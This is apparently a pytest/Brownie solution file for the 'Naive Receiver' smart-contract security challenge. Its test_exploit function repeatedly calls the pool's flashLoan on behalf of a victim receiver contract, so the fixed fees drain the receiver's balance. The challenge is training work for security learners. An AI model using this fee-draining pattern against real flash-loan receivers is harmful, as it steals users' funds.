import pytest

from brownie import accounts, FlashLoanReceiver,NaiveReceiverLenderPool

@pytest.fixture(scope='module')
def deployer(accounts):
    return accounts[0]

@pytest.fixture(scope='module')
def attacker(accounts):
    return accounts[1]


@pytest.fixture(scope='module')
def user(accounts):
    return accounts[2]


@pytest.fixture(scope='module')
def pool(deployer):
    return NaiveReceiverLenderPool.deploy({'from': deployer})

@pytest.fixture(scope='module')
def receiver(pool,user):
    return FlashLoanReceiver.deploy(pool.address, {'from': user})


@pytest.fixture(scope='module',autouse=True)
def setup(pool,receiver,deployer,user): 
    ''' [Challenge] Naive Receiver '''

   
    
    # SETUP SCENARIO

    #Pool has 1000 ETH in balance
    ETHER_IN_POOL = 1000e18

    # Receiver has 10 ETH in balance
    ETHER_IN_RECEIVER = 10e18

    deployer.transfer(to=pool.address,amount=ETHER_IN_POOL)
    
    assert pool.balance() == ETHER_IN_POOL

    user.transfer(receiver,ETHER_IN_RECEIVER)
       

def intial_state_test(pool,receiver):

    
     #Pool has 1000 ETH in balance
    ETHER_IN_POOL = 1000e18

    # Receiver has 10 ETH in balance
    ETHER_IN_RECEIVER = 10e18

    assert pool.balance() == ETHER_IN_POOL
    assert pool.fixedFee() == 1e18
    assert receiver.balance() == ETHER_IN_RECEIVER

    
     
    
    
def test_exploit(pool,receiver,attacker):
    # Exploit goes here
    while receiver.balance() >= pool.fixedFee():
        
        pool.flashLoan(receiver.address,'1 ether',{'from':attacker})



def test_success(pool,receiver):
    # SUCCESS CONDITION 


    assert receiver.balance() == 0

    assert pool.balance() ==  1010e18
   
     
   
